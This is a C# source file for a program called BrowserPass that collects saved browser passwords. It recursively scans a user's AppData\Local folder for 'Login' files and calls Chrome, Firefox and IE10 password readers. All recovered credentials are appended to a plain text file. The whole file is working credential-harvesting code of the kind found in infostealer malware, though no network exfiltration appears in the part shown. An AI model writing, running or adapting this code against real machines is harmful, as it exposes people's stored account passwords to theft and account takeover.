using System;
using System.Collections.Generic;
using System.IO;
using System.Diagnostics;

namespace BrowserPass
{
    // Missing windows.security? https://software.intel.com/en-us/articles/using-winrt-apis-from-desktop-applications
    class Program
    {

        static void GetAllFolderInPath(string path, List<string> list)
        {
            DirectoryInfo dx = new DirectoryInfo(path);//Assuming Test is your Folder
            DirectoryInfo[] diArr = dx.GetDirectories();
            if (diArr.Length == 0)
                return;
            foreach (DirectoryInfo dri in diArr)
                try
                {
                    GetAllFolderInPath(path + "\\" + dri.Name, list);
                    list.Add(path + "\\" + dri.Name);
                }
                catch
                {
                }
        }


        static List<string> GetAllFileInFolder(List<string> listFolder)
        {
            List<string> listFile = new List<string>();
            foreach (var path in listFolder)
            {
                try
                {
                    DirectoryInfo dx = new DirectoryInfo(@path);
                    FileInfo[] Files = dx.GetFiles("*"); //Getting Text files
                    foreach (FileInfo file in Files)
                        if (file.Extension == "" || file.Extension == ".json")
                            if (listFile.Contains(file.FullName) == false && file.Name.Contains("Login"))
                                listFile.Add(file.FullName);
                }
                catch
                {
                }

            }
            return listFile;
        }

        static void Main(string[] args)
        {
            Stopwatch timer = new Stopwatch();
            timer.Start();
            List<IPassReader> readers = new List<IPassReader>();
            DirectoryInfo dx = new DirectoryInfo(@"C:\Users\thang\AppData\Local");//Assuming Test is your Folder
            FileInfo[] Files = dx.GetFiles(); //Getting Text files
            var path = @"C:\Users\thang\AppData\Local";
            var listFolder = new List<string>();
            GetAllFolderInPath(path, listFolder);
            var xx = GetAllFileInFolder(listFolder);
            var chrome = new ChromePassReader();
            chrome.ReadPasswordsList(xx);
            timer.Stop();
            Console.WriteLine(timer.ElapsedMilliseconds.ToString());
            timer.Start();
            readers.Add(chrome);
            readers.Add(new FirefoxPassReader());
            readers.Add(new IE10PassReader());
            foreach (var reader in readers)
            {
                try
                {
                    foreach (var d in reader.ReadPasswords())
                        File.AppendAllText("user_.txt","/n" + d + "/n");
                }
                catch 
                {
                }
            }
            timer.Stop();
            Console.WriteLine(timer.ElapsedMilliseconds);
        }
    }
}
